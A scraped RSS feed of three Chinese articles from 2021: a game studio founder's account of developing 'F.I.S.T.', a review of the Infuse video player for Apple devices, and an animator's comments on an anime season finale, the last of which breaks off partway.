[{"title":"国产游戏《暗影火炬城》PS4/PS5 版于 9 月 7 日 先行推出，游戏体验如何？","date":"2021-09-15 08:01:53","description":"\n<p><i>《暗影火炬城》终于上市了，目前还只是在海外PlayStation平台，后续要有更多的平台、语言版本等着我们。但朋友们让我找个时间上知乎写点东西，也算是个PR，能让更多人了解这款游戏的开发故事。</i></p>\n<p><i>我本人并不喜欢在社交媒体上发表言论，我的知乎账号四年来一直完全处于静默状态，微博过去4年只转发了5条，就算是微信朋友圈过去4年也只转发了不到100条动态。面形公众的写作，对我是完全陌生的领域。这四年我之所以几乎放弃掉社交网络，原因无它，就是为了能够全部身心的投入到《暗影火炬城》中去，因为我知道这是我人生中最重要的一个机会，对初创的上海钛核也是。</i></p>\n<p><i>文章预期较长，无法一次写就，慢慢更新吧，有兴趣的可以关注一下，本人或者这个答案皆可。</i></p>\n<p><br></p>\n<h3><b>一、划过天空的VR彗星</b></h3>\n<p>2017年的10月，从钛核的办公室望出去，窗外是一片地铁上盖的绿地，这片绿地准确的报告着一年四季的变化，窗外是上海温暖和煦的秋天，可对我来说却如寒冬已至。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-77f0ed2decdc03ade1af91d24cbf3154_720w.jpg?rss\" data-caption=\"从钛核的办公室向外望去\" data-size=\"normal\" data-rawwidth=\"1270\" data-rawheight=\"635\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>此时的TiGames刚刚成立一年半的时间，我们刚刚上架了《奇境守卫》的第二部DLC，告别了赶版本的阶段。要知道，自从TiGames成立以来我们全体成员可以说一直是处于全力冲刺的状态，2016年5月正式动手开始制作《奇境守卫》，只用了10个月就完成项目开发、1次就通过了Sony PlayStation的项目适用性与VR舒适度审核、2个月就完成了多语言本地化、海外年龄分级、上架准备，总计12个月就把游戏发售到了全球绝大多数的地区。这样的项目效率连我们自己觉得不可思议。可到了10月，在完成了第二部DLC上线之后，连续一个星期大家都变得比较松弛，除了中午两小时固定的休息时间，其他时候也都开始“摸鱼”，打打游戏、刷刷网页，因为大家知道《奇境守卫》已经完成，不会有后续的更新，而新项目还只停留在原型阶段，看不出马上要开始生产的样子。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e3b9b6e34852be14205668dd826bd0be_720w.jpg?rss\" data-caption=\"2017年5月美服PSN上架的《奇境守卫》Demo\" data-size=\"normal\" data-rawwidth=\"1268\" data-rawheight=\"714\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>寒意从内外两个方向袭来。此时的VR生态已经开始展现出明日黄花的架势，设备销量开始停滞，玩家开机率也直线下降，“VR元年”可能永远是明年。外部融资环境也在收紧，2017年的下半年是公认的资本寒冬，公司如果依赖概念继续融资变得极其困难。而内部更面临着极为紧迫的士气低落问题，《奇境守卫》已结束，虽然口碑尚可，但商业成绩一塌糊涂，开发成本完全没有可能回收。这个时候团队很可能会因失去目标感，而倦怠、失落，进而失望、流失。</p>\n<p>《奇境守卫》的主版本是2017年5月上架PSVR的，后来分别在7月和10月上线了两个付费DLC。制作做这两个DLC的过程中，团队多数人依然保持了对项目的热情，因为上架销售后，我们的媒体评分、玩家反馈似乎都还不错，甚至我们还得到了中国最具官方背景的游戏大奖“金翎奖”的年度最佳VR游戏。但只有我知道这款曾经爬上VR游戏销售排行版的游戏实际首月销量只有几千份而已。这意味着，整个行业的VR游戏销售都十分惨淡，没人能够通过直接销售游戏获利，大家不过都是在烧钱，或多或少罢了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-efc93da4bbf81ad642ae3a25c6ca5661_720w.jpg?rss\" data-caption=\"《奇境守卫》第一关\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>连续两个月在与一些潜在的投资人接触之后，我非常肯定短期内不会再有融资机会，也就是说我们要着手制作的下一款游戏不能再是赔钱货，TiGames必须要依靠自己产品来存活下去。显然，我们不能在继续制作没有“钱途”VR游戏了。</p>\n<p>当时，我们已经有一个5人小组开始了下一款AA级的VR游戏：“Project Halley”。没错，我们用哈雷彗星作为这个项目的代号，原因有两个：其一，是传统，在我的职业生涯中第一个成功的游戏项目代号是“Mars”，而我在腾讯前沿技术中心制作的第一个VR游戏项目代号是“Comet”，所以我为这个项目用了代号“Halley”。第二个原因，这是一款科幻题材的VR游戏，玩家将驾驶着类似黑客帝国电影中的巨大单兵机甲，在无重力的太空中飞行，战斗，听起来酷毙了。所以用个天文术语来作为游戏代号实在是再适合不过，哈雷彗星是人类最早观察到的彗星，也是天空中最明亮的彗星，潜意识里我希望它也能无比耀眼。不过我似乎忘记了，哈雷彗星在中国传统上被称为“扫把星”，这可不是什么好彩头。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f57e381f8c1980702bbd2bf23f176fca_720w.jpg?rss\" data-caption=\"Project Halley的主角机甲\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"746\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>除了“大项目”Halley，我们还有一个小项目“Project Ceres”（没错，Ceres又是一个天体）这个项目规模更小，更像是一个试验。完全是为了当年极为热门的手机AR应用而制作的。当时Apple与Google都推出了基于移动设备AR解决方案，两家的年度发布会上都不遗余力的宣称自己的AR方案即将改变世界。作为以VR作为概念的TiGames当然也得有所动作，所以我们设计了一款非常复古的AR游戏，一个AR版本的“蒙特祖玛”。我想喜欢在PC上玩休闲游戏的人一定记得这个由彩色弹珠组成的消除类游戏，蜿蜒的轨道上彩色弹珠在轨道上不断前行，玩家要从一只怪异的青蛙嘴里射出同色的弹珠来消除整个彩珠队列。我们的AR版本，将这条轨道由平面扩展到立体的空间，看起来就像一个疯狂的过山车，彩珠队列在轨道上移动，玩家需要用手机对这些彩珠队列发射同色彩珠来消除它。没错，在Ceres里，你扮演的就是那个怪异的青蛙，只不过这只青蛙拿着个手机。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cd44e4aff65410aa52933a3c5722c719_720w.jpg?rss\" data-caption=\"Project Ceres 的测试图\" data-size=\"normal\" data-rawwidth=\"1270\" data-rawheight=\"634\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>听完我的描述，也许你还觉得这两个项目挺酷的。没错，我们当时也是这么认为的，通过头脑风暴了无数次，在一大堆“创意”中精选出来的两个“好点子”。可到了2017年10月，我知道，这些都只能是吞钱的陷阱，绝无可能为公司带来正向的现金。我们得停掉它们，毫不犹豫，然后重新出发去制作能够为TiGames带来真正希望的项目。</p>\n<h3><b>二、暗影静安</b></h3>\n<p>我是个光荣《三国志》的老粉，当年从386时代的3代、4代一路玩过来的。要说这游戏给我最大的影响，可能就是对“士气”这个数值的巨大感知，士气低落的部队就算是你集齐五虎上将也无法打下胜仗。如何保持住士气的同时，将团队平移到新的项目上，是首当其冲要解决的问题。</p>\n<p><br></p>\n<p>---------------------------------------------------------------------</p>\n<p>待更新线</p>\n<p>---------------------------------------------------------------------</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ZhangTao_TiGames?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">张弢</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485084293/answer/2122276060?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">182 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/361938709?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在入手ps4还是等到明年ps5发售？</a><br><a href=\"http://www.zhihu.com/question/381977573?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高考之后想玩主机游戏，但那时候PS5还没出，考虑到PS4可能被PS5顶，但又非常想玩怎么办？跪求大佬？</a><br>\n","link":"http://www.zhihu.com/question/485084293/answer/2122276060?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"也许是 Apple 平台最全能的视频播放 App：Infuse","date":"2021-09-15 07:02:57","description":"\n<p>当我们讨论 Apple 平台的视频播放器时，Infuse 一定是 Big Players 中的一员。Infuse 不仅支持了 Apple 全家桶中能够播放视频的全部设备，还几乎支持所有常用格式的视频文件。同时，Infuse 还是一款剧集管理工具，能够自动下载元数据，还能保持影视资源库的整洁有序。</p>\n<h2>实力过硬</h2>\n<p>Infuse 的第一个版本发布于 2013 年，一开始只支持 iOS 设备。2015 年，Infuse 4.0 正式支持了 Apple TV，而今年 5 月份发布的 Infuse 7 提供了 macOS 版本。至此，Infuse 已经覆盖 iPhone、iPod touch、iPad、Apple TV、Mac 等全系产品，成为了名副其实的 Apple 全家桶应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/4b718c6fc71f0878f14e25b64f4606aa\"><figcaption>来源：https://firecore.com/infuse</figcaption></figure><p>基础过硬是 Infuse 的第一大特点。作为一款视频播放器，能够支持广泛的视频格式和解码器至关重要。至今，Infuse 已经支持了几乎全部常用的视频、音频、字幕格式，而其中支持的部分小众格式我相信大多数人基本不会遇到。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>视频格式</strong></td>\n<td><strong>音频格式</strong></td>\n<td><strong>字幕格式</strong></td>\n</tr>\n<tr>\n<td>3GP</td>\n<td>AAC</td>\n<td>DVB</td>\n</tr>\n<tr>\n<td>AVI</td>\n<td>AC3</td>\n<td>DVDSUB</td>\n</tr>\n<tr>\n<td>ASF</td>\n<td>E-AC3</td>\n<td>MICRODVD</td>\n</tr>\n<tr>\n<td>BDMV</td>\n<td>DTS</td>\n<td>MPL2</td>\n</tr>\n<tr>\n<td>DIVX</td>\n<td>DTS-HD</td>\n<td>PGS</td>\n</tr>\n<tr>\n<td>DVD</td>\n<td>FLAC</td>\n<td>SMI</td>\n</tr>\n<tr>\n<td>MEDIA</td>\n<td>MP3</td>\n<td>SSA/ASS</td>\n</tr>\n<tr>\n<td>DVR-MS</td>\n<td>OGG</td>\n<td>SRT</td>\n</tr>\n<tr>\n<td>FLV</td>\n<td>DOLBY</td>\n<td>SUB</td>\n</tr>\n<tr>\n<td>ISO/IMG</td>\n<td>WMA</td>\n<td>TIMED TEXT</td>\n</tr>\n<tr>\n<td>M2TS</td>\n<td> </td>\n<td>TMP</td>\n</tr>\n<tr>\n<td>M4V</td>\n<td> </td>\n<td>TXT</td>\n</tr>\n<tr>\n<td>MKV</td>\n<td> </td>\n<td>VOBSUB</td>\n</tr>\n<tr>\n<td>MOV</td>\n<td> </td>\n<td>VTT</td>\n</tr>\n<tr>\n<td>MP4</td>\n<td> </td>\n<td>XSUB</td>\n</tr>\n<tr>\n<td>MPEG</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>MTS</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>MXF</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>OGM</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>OGV</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>TS</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>VIDEO_TS</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>WEBM</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>WM</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>VWTV</td>\n<td> </td>\n<td> </td>\n</tr>\n</tbody></table></figure><p>特别值得一提的是 Infuse 对杜比音频解码的支持。早在 2014 年 10 月发布的 Infuse 3 中，就已经实现了对 DTS® 以及 DTS-HD® 音频播放。这比 2016 年 3 月，Apple 在 iOS 9.3 版本中正式原声支持杜比音频早了近 2 年时间。所以 Infuse 也是当时为数不多、甚至是唯一支持杜比音频解码的 iOS 视频播放器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/51bf26034448f6d17c397ec24da29cbc\"><figcaption>来源：https://www.dolby.com/technologies/dolby-atmos/</figcaption></figure><p>而后续在 Infuse 6 中，又加入了对 Dolby® Digital Plus（AC3/E-AC3）的支持，这也就是我们经常所说的杜比全景声（Dolby Atmos）。当然，如今支持 Dolby Atmos 早已不仅只有 Infuse，得益于 Apple 原生支持了 Dolby Atmos，类似于 <a href=\"https://apps.apple.com/cn/app/nplayer/id1116905928\" target=\"_blank\">nPlayer</a>、<a href=\"https://apps.apple.com/cn/app/vlc-for-mobile/id650377962\" target=\"_blank\">VLC</a> 等视频播放器也已经跟进了该特性。Apple Music 也在今年 5 月份宣布支持 Dolby Atmos 串流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/2f2c04ee0828282e23b4db24a5c7bcb1.png\"><figcaption>Infuse 里程碑</figcaption></figure><p>除了杜比音频，另一项值得一提的就是杜比视界（Dolby Vision）了。2017 年 9 月，iPhone X 是第一款在其 Super Retina OLED 屏幕上引入对杜比视界 HDR 支持的 iOS 设备。同年 11 月，Infuse 5.6 也正式支持了 HDR 视频回放。杜比视界因其出色的亮度、对比度和色彩深得影视迷们的喜爱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/a45a9b0271d9415b8408de4d7923c231\"><figcaption>杜比视界 HDR 和 SDR 视频画面对比</figcaption></figure><p>目前，Infuse 7 <strong>同时支持</strong>了 DV Profile 8.1 和 Profile 5 的 4K 单层（Single Layer）杜比视界视频回放。相较其他几款常见的视频播放器，<a href=\"https://apps.apple.com/cn/app/nplayer/id1116905928\" target=\"_blank\">nPlayer</a> 不支持 Profile 5 的 4K 杜比视界视频回放，<a href=\"https://apps.apple.com/cn/app/vlc-for-mobile/id650377962\" target=\"_blank\">VLC</a> 则完全不支持 HDR 视频回放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/eddb33f0b492f79f24172d307a889f07\"><figcaption>Infuse 支持 HDR 4K 视频回放</figcaption></figure><p>总体来讲，如果你想要在 iOS 设备上回放 4K HDR 视频，Infuse 无疑是最佳选择。而如果你想要通过 Apple TV 连接 OLED 电视回放 HDR 视频，<strong>Infuse 则几乎成为了唯一选择</strong>。</p>\n<h2>无缝串流</h2>\n<p>使用第三方应用播放视频最直接的方式当然是将视频拷贝到应用中，但这并不是使用 Infuse 最推荐的方式。为了更方便地观看高清视频，你可以通过各种方式进行串流播放。</p>\n<p>目前，Infuse 支持的网络协议非常丰富，包括 SMB、NFS、FTP、SFTP、UPnP、DLNA 和 WebDAV 等。通过这些协议，你可以浏览、下载和播放视频。以较为常用的 SMB 协议为例，你可以通过电脑下载视频后，基于该协议直接在移动设备上播放视频。首先，我们需要检查电脑是否启用了 SMB 文件共享，<a href=\"https://support.apple.com/zh-cn/guide/mac-help/mh17131/mac\" target=\"_blank\">Mac</a> 和 <a href=\"https://pureinfotech.com/setup-network-file-sharing-windows-10/\" target=\"_blank\">Windows</a> 电脑开启的方式各有不同。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/c00b19200ad1ffa272b9db67b52c8897\"><figcaption>Mac 打开 SMB 文件共享</figcaption></figure><p>当文件共享被启用后，我们就可以在 iPhone、iPad 或者 Apple TV 上打开 Infuse，通过 SMB 协议连接到电脑。连接的步骤如下：</p>\n<ol>\n<li>点击设置（齿轮）图标，并选择「新增文件来源」。</li>\n<li>一旦进入「新增文件来源」菜单，任何检测到的设备将被列在「可用的共享」底部。</li>\n<li>连接并输入用户名和密码，默认为电脑的用户名和登录密码。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/6ff7d09ecd931c1c937641446b41e900\"><figcaption>Infuse 添加 SMB 局域网设备</figcaption></figure><p>在这个过程中，如果「可用的共享」没有检测到设备，你可以通过点击其他手动设置连接。参考上方图三，其中：</p>\n<ul>\n<li>名称：Infuse 中显示的共享名称，自定义。</li>\n<li>地址：局域网设备的 IP 地址。</li>\n<li>用户名/密码：设备登录的用户名和密码。值得注意的是，如果连接到 Time Capsule 或 Airport Extreme，用户名需要设置为 admin。</li>\n</ul>\n<p>其他网络协议的设置方式大同小异，这里就不再赘述了。除了基于现有的网络协议，Infuse 还支持直接连接到常用的云盘服务，例如：Dropbox、Google Drive、OneDrive、Box、MEGA 等。当然，大部分云盘都是国外的产品，国内云盘基本都不支持。</p>\n<p>虽然 Infuse 没有原生集成国内的云盘，但我们还是可以连接到坚果云等开放了 WebDAV 协议的云盘。以坚果云为例，在设置页面开启 WebDAV，并在 Infuse 中创建连接即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/09525c5455ef3b8c4b76659b041935ab\"><figcaption>Infuse 添加 WebDAV 协议坚果云 </figcaption></figure><p>而对于近期因不限速而热度上升的阿里云盘，网络上也提供了 <a href=\"https://github.com/zxbu/webdav-aliyundriver\" target=\"_blank\">开启 WebDAV 的方法</a> 可供参考。除了上述两类串流方式，Infuse 还原生集成了 Plex、Emby、Jellyfin 等流媒体托管平台。你可以通过 Infuse 直接访问上述平台的视频库，还支持同步观看历史和播放进度等常用的功能。由于提到的这几个流媒体托管平台国内用户并不常用，这里就不再赘述了。</p>\n<h2>剧集管家</h2>\n<p>Infuse 的硬实力是强大的解码能力和丰富的串流协议，但 Infuse 的潜力远不止于此。包括我在内的众多喜欢 Infuse 的用户其实更偏爱于 Infuse 强大的剧集管理能力。当你通过云盘、电脑、NAS 等储存设备来整理自己钟爱的剧集时，都只是孤立的视频文件。而 Infuse 则可以赋予这些视频文件详细的元数据（Metadata）。</p>\n<p>我们通过网易云音乐等流媒体应用听歌的时候，你会发现一首歌包含有封面、歌手、作词、作曲、歌词等信息，这些都是音频的元数据。电影和剧集也一样，完整的元数据包含有封面、演职人员信息、上映日期、单集介绍等一系列详细的信息，而这些信息往往并不会直接内嵌在视频文件中。</p>\n<p>最为知名的是 <a href=\"https://www.themoviedb.org/\" target=\"_blank\">TMDb</a> ，这是一个由社区维护的电影、电视节目、演员和剧组的在线数据库，其收集了近 70 万部电影、12 万部剧集、200 多万演职人员信息和近 300 万张图片。Infuse 通过接入 TMDb 数据库，能够自动匹配视频文件包含的元数据并以精美的样式展示出来。</p>\n<p>当然，为了方便 Infuse 能够自动匹配数据，其对视频文件的命名规则有一定要求。例如剧集通常需要命名为类似 <code>show-name_s01e02.mkv</code> 样式，包含有剧集名称，相应的季和集数。当然 Infuse 最大程度地兼容了常见流媒体平台购买下载剧集之后的默认名称规则，所以一般情况下无需手动修改视频文件名称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/80b5b79997211d79165e041e5d006c70\"><figcaption>Infuse 自动下载剧集元数据并展示</figcaption></figure><p>与此同时，Infuse 还能够对剧集和电影按照常见的类别进行自动归类，例如分为：动作、喜剧、剧情、纪录片等。还能通过自动获取评分信息，对影片进行排名。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/c01bc734311892aaed7d212c0aaa2e7c\"><figcaption>Infuse 主界面提供的自动归类展示</figcaption></figure><p>当然，你也可以创建自己的播放列表，根据偏好对视频进行分组管理，并使用过滤器进行浏览。而这一切都可以基于 iCloud 完成多设备同步，保证整个 Infuse 播放列表、观看历史和评级在你的任何一台设备上都完全一致。这种体验是极其舒服的，例如你先在客厅的电视上看剧，回卧室后还可以躺着在手机上继续看后续的内容，无需任何额外的手动操作。</p>\n<p>除了通过 iCloud 同步 Infuse 的设置和状态，很多剧迷们会使用 <a href=\"https://trakt.tv/\" target=\"_blank\">Trakt</a> 来管理自己的观影记录。Trakt 是一个可以用来跟踪电视节目和电影的平台，与大部分类似用于记录剧集观看记录的服务不同，Trakt 能够与常见流媒体服务和播放器进行集成，一切都是自动完成的。而 Trakt 提供的数据面板可以汇总你的影视观看记录以及个人追剧日历。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/7b2eed2771043569843c1053729cd0fc\"><figcaption>Trakt 剧集进度自动追踪</figcaption></figure><p>Infuse 同样集成了 <a href=\"https://trakt.tv/\" target=\"_blank\">Trakt</a> 服务，在购买 Pro 版本后，Infuse 支持与 Trakt 之间的双向同步，包括：实时的观看历史和播放位置，以及剧集的评分和评论。</p>\n<h2>电视伴侣</h2>\n<p>虽然移动设备的普及让大多数观剧过程都放到了手机或者平板上，但电视依旧是家庭中绝佳的大屏观影设备。如果你正好购买了一台 Apple TV 和 OLED 电视，那么 Infuse 一定是你在电视上观影的不二之选。</p>\n<p>Infuse 是在 2015 年 9 月第四代 Apple TV 发布后正式提供了 tvOS 版本的应用。第四代 Apple TV 开始允许用户下载第三方应用，并增加了 Dolby Digital Plus 音频的支持。而今年发布的 Apple TV 4K 已经正式支持了 Dolby Vision 和 Dolby Atmos，Infuse 也在第一时间完成了适配工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/8cde5cc440ca1ad4731cfba6789fb257\"><figcaption>Apple TV 4K 版本 Infuse 主界面</figcaption></figure><p>从整体的设计上，tvOS 版本的 Infuse 和其他平台的应用并无太大不同，除了界面布局针对电视显示做了一些调整之外，功能和菜单选项等都几乎一致。</p>\n<p>这里值得一提的是新的 HomePod 家庭影院选项。如今，HomePod 已经支持搭配 Apple TV 4K 在家中营造出具有杜比全景声或环绕声音效的影院级体验。通过设置将 HomePod 用作电视扬声器后，Infuse 能直接通过 HomePod 播放 Dolby Atmos 音频，并支持多达 7.1 通道的 24 位 48KHz 音频串流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/14c400925d30e2bd02905fa31e40e31c\"><figcaption>通过 HomePod 播放 Dolby Atmos 音频</figcaption></figure><p>除此之外，考虑到在电视上展示出更精美的效果，tvOS 版本的 Infuse 支持针对资源库设置自定义封面，这是其他平台版本尚未支持的特性。</p>\n<h2>总结</h2>\n<p>Infuse 是我最常用的视频播放应用，在撰写这篇文章的过程中，我也挑选并体验了 Apple 平台上的其他几款知名视频播放器应用，包括 <a href=\"https://apps.apple.com/cn/app/nplayer/id1116905928\" target=\"_blank\">nPlayer</a>、<a href=\"https://apps.apple.com/cn/app/vlc-for-mobile/id650377962\" target=\"_blank\">VLC for mobile</a>、<a href=\"https://apps.apple.com/cn/app/kmplayer/id835776444\" target=\"_blank\">KMPlayer</a> 等。其中，我觉得 nPlayer 和 VLC 我觉得还是值得拿出来和 Infuse 对比一下。</p>\n<p>喜欢 nPlayer 的用户也非常多，在支持的视频格式、解码能力、串流协议等方面和 Infuse 相差不大。其最大的优势在于 30 元的买断价格，而劣势在于暂未提供 tvOS 版本同时不支持 Profile 5 的 4K 杜比视界视频回放。此外，官方上次更新时间停留在 2020 年 11 月（2021 年 9 月记录），时隔近一年时间了，不仅让我对这款应用的后续状况产生担忧。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>对比</strong></td>\n<td><strong>Infuse 7</strong></td>\n<td><strong>nPlayer</strong></td>\n<td><strong>VLC</strong></td>\n</tr>\n<tr>\n<td>设计</td>\n<td>★ ★ ★ ★ ★</td>\n<td>★ ★ ★</td>\n<td>★ ★ ★</td>\n</tr>\n<tr>\n<td>解码能力</td>\n<td>4K HDR</td>\n<td>4K HDR</td>\n<td>4K SDR</td>\n</tr>\n<tr>\n<td>杜比全景声</td>\n<td>🟢</td>\n<td>🟢</td>\n<td>🟢</td>\n</tr>\n<tr>\n<td>杜比视界</td>\n<td>🟢</td>\n<td>⛔️</td>\n<td>🔴</td>\n</tr>\n<tr>\n<td>元数据</td>\n<td>★ ★ ★ ★ ★</td>\n<td>★</td>\n<td>★</td>\n</tr>\n<tr>\n<td>价格</td>\n<td>68 元／每年</td>\n<td>30 元／买断</td>\n<td>完全免费</td>\n</tr>\n<tr>\n<td>平台</td>\n<td><code>iOS／iPadOS／tvOS／macOS</code></td>\n<td><code>iOS／iPadOS</code></td>\n<td><code>iOS／iPadOS／tvOS／macOS</code></td>\n</tr>\n</tbody></table></figure><p>而 VLC 的优势在于其完全开源免费，同时支持 Apple 全平台设备。当然其不支持杜比视界视频回放也是硬伤，但这对于大部分普通用户而言无伤大雅。VLC 作为一款免费应用，做到目前这种程度已经非常良心了。当然，无论是 nPlayer 还是 VLC，它们大多都还仅仅是单纯的视频播放应用。Infuse 提供的剧集及元数据管理特性，以及整体的精美程度都有着很大的优势。</p>\n<p>最后让我们来说一说 Infuse 的定价。目前 Infuse 在 App Store 国区定价采用了订阅和买断兼顾的策略，分别是 7 元/月，68 元/年，488 元/终身。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/ff040942fb47ad700f3048ff85a6f59f\"><figcaption>Infuse 7 价格及高级特性</figcaption></figure><p>对于这几个档次，我的建议是根据自己使用 Infuse 频率来定，如果你是一个剧迷，拥有 Apple 全家桶，且每天或者每周都会使用到 Infuse，那毫不犹豫考虑按年订阅。订阅付费能够当你在每次大版本升级时都不需要支付额外的费用，考虑到 Infuse 的更新频率且订阅 1 次即可解锁全平台设备，这个价格还是相当良心了。最后，如果你对 Infuse 感兴趣，欢迎到 <a href=\"https://apps.apple.com/cn/app/infuse-7/id1136220934\" target=\"_blank\">App Store</a> 和 <a href=\"https://apps.apple.com/cn/app/infuse-7/id1136220934\" target=\"_blank\">Mac App Store</a> 免费下载体验。</p>\n<span class=\"ss-application\" app-id=\"16043\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68706"},{"title":"如何评价国产动画《眷思量》第十五集大结局？","date":"2021-09-15 05:00:22","description":"\n<p>第一季终于收官 ฅ( ̳• ◡ • ̳)ฅ</p>\n<p>这两天依旧忙碌，第一季工作结束也终于有更多精力专心推第二季和其他项目的制作工作，看来想给自己放个假的计划要挪到国庆节一块了.·´¯`(&gt;▂&lt;)´¯`·.。</p>\n<p>第一季主要任务是对岛上众生状态和男女主所处外界压力的铺垫，大家应该能感觉到结尾放出的信息都是为第二季的压力来临做准备。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-13422a5861d4a444aea5604d41f70e90_720w.jpg?rss\" data-rawwidth=\"2032\" data-rawheight=\"1142\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-13422a5861d4a444aea5604d41f70e90\" data-watermark-src=\"v2-da395ed0785bd979d384bc1cc76ee525\" data-private-watermark-src=\"v2-16c8099f38aeb1c76d19e267eeba6ada\"></p>\n<p>15集山路戏中玄丽两人“初次相处”我很重视，对神态动作都下了功夫讲戏、动捕和K动画。争取可以展现细腻丰富的情绪层次。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ec14b6b0b4cd5d8e3c54eaa0005752f6_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1331\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-ec14b6b0b4cd5d8e3c54eaa0005752f6\" data-watermark-src=\"v2-0b01df7029a9d0dffa5c5a29367f7a2c\" data-private-watermark-src=\"v2-1bd501a0afbae5d6d12f0dc1d9d2af7e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-393fc6c9fd78f661e34ac2b79e06d2e3_720w.jpg?rss\" data-rawwidth=\"2094\" data-rawheight=\"1082\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-393fc6c9fd78f661e34ac2b79e06d2e3\" data-watermark-src=\"v2-567a84d93a6efcb2960c5d7129836c4c\" data-private-watermark-src=\"v2-457d0dd6922ab5b62add46e01c4f2db8\"></p>\n<p>玄哥相对简单，主要是他在我脑海里实在是帅了太多年了_(´ཀ`」 ∠)__ ，讲起戏来犹在眼前，比较顺畅，可以说在第一季里对帅的极致幻想都放到玄哥身上亦不为过。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-cb73fee0c30596e61c5593f131da9c2e_720w.jpg?rss\" data-rawwidth=\"2028\" data-rawheight=\"1136\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-cb73fee0c30596e61c5593f131da9c2e\" data-watermark-src=\"v2-77f4fcbddc7e510fc06df2c3359a9fc7\" data-private-watermark-src=\"v2-6d320e83d6f5a07b2a3e12c31e8bd468\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e91e070f825cf69e9ea05d75056b567b_720w.jpg?rss\" data-rawwidth=\"2032\" data-rawheight=\"1136\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e91e070f825cf69e9ea05d75056b567b\" data-watermark-src=\"v2-d2fb0204d6c5f1ae1454830ef4458b0d\" 